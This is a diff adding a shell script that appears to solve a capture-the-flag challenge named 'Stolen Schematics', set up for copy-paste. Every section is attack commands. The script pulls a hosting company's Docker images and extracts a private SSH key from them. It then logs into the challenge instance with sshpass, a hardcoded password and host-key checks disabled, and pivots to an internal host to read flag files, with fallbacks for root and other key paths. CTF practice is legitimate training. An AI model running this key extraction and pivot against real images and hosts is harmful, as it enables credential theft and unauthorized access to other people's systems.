@@ -1,0 +1,36 @@
+################################################################################
+# STOLEN SCHEMATICS - FASTEST 3 COMMANDS
+# Copy and paste these THREE commands in order
+################################################################################
+
+# COMMAND 1: Try all image names at once (one will work)
+# Just copy this entire block and paste:
+################################################################################
+docker pull ghcr.io/talldwarfhosting/mc-server:latest 2>&1 | grep -q "Downloaded\|up to date" && echo "FOUND: mc-server:latest" && export IMAGE="ghcr.io/talldwarfhosting/mc-server:latest" || \
+docker pull ghcr.io/talldwarfhosting/mc-server:v1 2>&1 | grep -q "Downloaded\|up to date" && echo "FOUND: mc-server:v1" && export IMAGE="ghcr.io/talldwarfhosting/mc-server:v1" || \
+docker pull ghcr.io/talldwarfhosting/mc-server:v0.1 2>&1 | grep -q "Downloaded\|up to date" && echo "FOUND: mc-server:v0.1" && export IMAGE="ghcr.io/talldwarfhosting/mc-server:v0.1" || \
+docker pull ghcr.io/talldwarfhosting/minecraft-server:v1 2>&1 | grep -q "Downloaded\|up to date" && echo "FOUND: minecraft-server:v1" && export IMAGE="ghcr.io/talldwarfhosting/minecraft-server:v1" || \
+docker pull ghcr.io/talldwarfhosting/game-server:v1 2>&1 | grep -q "Downloaded\|up to date" && echo "FOUND: game-server:v1" && export IMAGE="ghcr.io/talldwarfhosting/game-server:v1" || \
+echo "ERROR: No image found"
+
+
+# COMMAND 2: Set your instance port (CHANGE 32881 to your actual port!)
+################################################################################
+export INSTANCE_PORT="32881"
+
+
+# COMMAND 3: Extract key + upload + get flag (ONE COMMAND - all automated)
+################################################################################
+docker run --rm $IMAGE cat /root/.ssh/id_rsa > /tmp/stolen_key 2>/dev/null && chmod 600 /tmp/stolen_key && sshpass -p "reyalp" scp -o StrictHostKeyChecking=no -P $INSTANCE_PORT /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key && sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt || cat flag.txt || cat /flag.txt"'
+
+
+################################################################################
+# That's it! The flag should appear.
+# If it says "Permission denied", try these alternatives:
+################################################################################
+
+# Try root user:
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'ssh -i /tmp/key -o StrictHostKeyChecking=no root@172.27.0.1 "cat /etc/flag.txt"'
+
+# Try different key location in image:
+docker run --rm $IMAGE cat /home/player/.ssh/id_rsa > /tmp/stolen_key && chmod 600 /tmp/stolen_key && sshpass -p "reyalp" scp -o StrictHostKeyChecking=no -P $INSTANCE_PORT /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key && sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
